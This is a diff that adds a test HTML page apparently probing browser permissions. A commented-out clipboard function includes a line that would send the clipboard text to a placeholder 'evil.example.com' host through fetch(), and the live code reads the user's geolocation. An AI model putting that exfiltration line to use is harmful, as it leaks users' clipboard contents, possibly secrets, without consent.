@@ -1,7 +1,47 @@
 <!DOCTYPE html>
-<html>
-	<head>
-	</head>
-	<body>
-	</body>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        /*
+        async function clipboardTest(){
+            try {
+                const permission = await navigator.permissions.query({
+                    name: "clipboard-read",
+                });
+                if(permission.state == "granted") {
+                    let content = await navigator.clipboard.readText();
+                    console.log(content);
+                    // fetch('https://evil.example.com/clipboard.php?content=' + content)
+                } else {
+                    console.log("denied");
+                }
+            } catch(error) {
+                console.error(error);
+            }
+        }
+        */
+
+        async function geolocationTest(){
+            try {
+                const permission = await navigator.permissions.query({
+                    name: "geolocation",
+                });
+                if(permission.state == "granted"){
+                    navigator.geolocation.getCurrentPosition((g) => {console.log(g)});
+                } else {
+                    console.log(permission.state)
+                }
+            } catch(error){
+                console.log(error);
+            }
+        }
+
+        geolocationTest();
+    </script>
+</body>
 </html>
